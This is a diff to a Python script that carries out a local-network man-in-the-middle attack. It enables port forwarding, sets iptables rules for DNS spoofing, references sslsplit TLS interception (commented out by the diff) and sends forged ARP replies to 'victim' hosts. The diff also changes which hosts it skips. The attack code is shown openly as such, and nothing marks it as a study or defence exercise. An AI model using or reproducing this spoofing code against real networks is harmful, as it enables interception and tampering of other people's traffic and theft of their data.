@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 import netfilterqueue
 import os
 import threading
@@ -110,7 +111,7 @@ if __name__ == "__main__":
     enable_port_forwarding()
 
     # execute sslplit 
-    sslsplit()
+    # sslsplit()
 
     # iptables rules for dns spoofing
     os.system(
@@ -130,8 +131,7 @@ if __name__ == "__main__":
             # send arp relies spoofing
             print(" ")
             for j in range(0,len(ip)):
-                if(ip[j]!="10.0.2.2" and ip[j]!="10.0.2.3"):
-                    #print("Send to: ",ip[j]," ",mac[j]),
+                if(ip[j].split(".")[3] != "3" and ip[j].split(".")[3] != "254"):
                     victimpacket = ARP( op      =  2,
                                         pdst    = ip[j],            # victim's IP
                                         hwdst   = mac[j],           # victim's MAC 
